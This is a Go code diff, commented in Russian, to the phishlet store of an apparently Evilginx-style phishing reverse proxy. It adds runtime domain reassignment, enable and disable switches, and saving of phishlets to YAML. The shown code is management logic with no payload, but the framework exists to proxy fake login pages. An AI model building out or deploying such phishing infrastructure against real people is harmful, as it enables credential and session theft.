@@ -14,9 +14,11 @@ import (
 )
 
 type Store struct {
-	mu    sync.RWMutex
-	byID  map[string]*core.Phishlet
+	mu     sync.RWMutex
+	byID   map[string]*core.Phishlet
 	byHost map[string]*entry // "login.example.com" -> phishlet+host
+	dir    string            // запомненный LoadDir (для Save)
+	src    map[string]string // id -> исходный файл (чтобы Save не плодил дубли)
 }
 
 type entry struct {
@@ -25,7 +27,7 @@ type entry struct {
 }
 
 func NewStore() *Store {
-	return &Store{byID: map[string]*core.Phishlet{}, byHost: map[string]*entry{}}
+	return &Store{byID: map[string]*core.Phishlet{}, byHost: map[string]*entry{}, src: map[string]string{}}
 }
 
 func (s *Store) LoadDir(dir string) error {
@@ -36,6 +38,8 @@ func (s *Store) LoadDir(dir string) error {
 	s.mu.Lock()
 	s.byID = fresh.byID
 	s.byHost = fresh.byHost
+	s.dir = dir
+	s.src = fresh.src
 	s.mu.Unlock()
 	return nil
 }
@@ -112,6 +116,7 @@ func loadDir(dir string) (*Store, error) {
 			return nil, fmt.Errorf("%s: duplicate id %q", f, p.ID)
 		}
 		fresh.byID[p.ID] = &p
+		fresh.src[p.ID] = f
 		for i := range p.ProxyHosts {
 			h := &p.ProxyHosts[i]
 			for _, d := range p.BaseDomains {
@@ -141,6 +146,93 @@ func validate(p *core.Phishlet) error {
 			return fmt.Errorf("sub_filters: bad search/replace")
 		}
 	}
+	return nil
+}
+
+// SetDomains меняет base_domains фишлета на лету (как `phishlets hostname`
+// в Evilginx): чистит старые host-ключи, проверяет конфликты, переиндексирует.
+func (s *Store) SetDomains(id string, domains []string) error {
+	if len(domains) == 0 {
+		return fmt.Errorf("domains: at least 1 required")
+	}
+	for _, d := range domains {
+		d = strings.TrimSpace(strings.ToLower(d))
+		if !strings.Contains(d, ".") || strings.ContainsAny(d, " \t/") {
+			return fmt.Errorf("domains: invalid %q", d)
+		}
+	}
+	for i := range domains {
+		domains[i] = strings.TrimSpace(strings.ToLower(domains[i]))
+	}
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	p, ok := s.byID[id]
+	if !ok {
+		return fmt.Errorf("unknown phishlet %q", id)
+	}
+	// Конфликты с чужими ID заранее.
+	for i := range p.ProxyHosts {
+		for _, d := range domains {
+			key := strings.ToLower(p.ProxyHosts[i].PhishSub + "." + d)
+			if dup, taken := s.byHost[key]; taken && dup.ph.ID != id {
+				return fmt.Errorf("proxy host %q taken by %q", key, dup.ph.ID)
+			}
+		}
+	}
+	for _, h := range p.ProxyHosts {
+		for _, d := range p.BaseDomains {
+			delete(s.byHost, strings.ToLower(h.PhishSub+"."+d))
+		}
+	}
+	p.BaseDomains = append([]string(nil), domains...)
+	for i := range p.ProxyHosts {
+		h := &p.ProxyHosts[i]
+		for _, d := range p.BaseDomains {
+			s.byHost[strings.ToLower(h.PhishSub+"."+d)] = &entry{ph: p, h: h}
+		}
+	}
+	return nil
+}
+
+// SetEnabled включает/выключает фишлет без рестарта.
+func (s *Store) SetEnabled(id string, enabled bool) error {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	p, ok := s.byID[id]
+	if !ok {
+		return fmt.Errorf("unknown phishlet %q", id)
+	}
+	p.Enabled = enabled
+	return nil
+}
+
+// Save пишет фишлет обратно в его исходный файл (или <dir>/<id>.yaml
+// для runtime-добавлений) — персист runtime-правок без дублей.
+func (s *Store) Save(id string) error {
+	s.mu.RLock()
+	p, ok := s.byID[id]
+	dir := s.dir
+	path := s.src[id]
+	s.mu.RUnlock()
+	if !ok {
+		return fmt.Errorf("unknown phishlet %q", id)
+	}
+	if dir == "" {
+		return fmt.Errorf("no dir (LoadDir not called)")
+	}
+	if path == "" {
+		path = filepath.Join(dir, id+".yaml")
+	}
+	b, err := yaml.Marshal(p)
+	if err != nil {
+		return err
+	}
+	if err := os.WriteFile(path, b, 0o600); err != nil {
+		return err
+	}
+	s.mu.Lock()
+	s.src[id] = path
+	s.mu.Unlock()
 	return nil
 }
 
